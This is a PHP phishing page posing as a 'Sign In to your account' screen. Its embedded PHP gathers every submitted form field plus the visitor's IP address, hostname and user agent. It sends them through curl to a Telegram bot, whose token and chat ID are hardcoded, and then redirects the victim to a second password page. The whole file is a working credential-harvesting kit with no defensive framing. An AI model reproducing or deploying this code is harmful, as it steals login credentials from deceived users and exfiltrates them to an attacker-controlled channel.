<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign In to your account</title>
  <link rel="icon" href="favicon.png">
  <link rel="stylesheet" href="password.css">
    <style>
        /* .loader {
            border: 8px solid #fb8a01;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: auto;
            margin-top: 20%;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #loading-text {
            text-align: center;
            margin-top: 10px;
        } */
    </style>
</head>
<body>
    <!-- <div class="loader"></div>
    <div id="loading-text">Loading...</div> -->

    <?php
    // Your PHP code here 8337096282:AAF8TwM1zOm8gU05lCQ_W5UGVPpyT4mldXs
    $telegram_BOT_zoolander = '8337096282:AAF8TwM1zOm8gU05lCQ_W5UGVPpyT4mldXs';
    $telegram_Chat_ID  = '8031953641';

    $ip = getenv("REMOTE_ADDR");
    $ThanksURL = "thanks.html";
    $zoolanderzoolanderzoolanderzoolanderzoolander = "";
    
    foreach ($_POST as $Field => $Value) {
        $zoolanderzoolanderzoolanderzoolanderzoolander .= "$Field: $Value\n";
    }
    $zoolanderzoolanderzoolanderzoolanderzoolander .= "\n" . @gethostbyaddr($_SERVER["REMOTE_ADDR"]) . "\n" . $_SERVER["HTTP_USER_AGENT"];
    $zoolanderzoolanderzoolanderzoolanderzoolander = htmlspecialchars($zoolanderzoolanderzoolanderzoolanderzoolander, ENT_NOQUOTES);

    if (isset($_POST)) {
        $website = "https://api.telegram.org/bot" . $telegram_BOT_zoolander;
        $params = [
            'chat_id' => $telegram_Chat_ID,
            'text' => $zoolanderzoolanderzoolanderzoolanderzoolander . "<br>" . $ip,
        ];
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    ?>

    <script>
        setTimeout(function () {
            window.location.href = "passwordii.php";
        }, 100); // Redirect after 5 seconds
    </script>
</body>
</html>
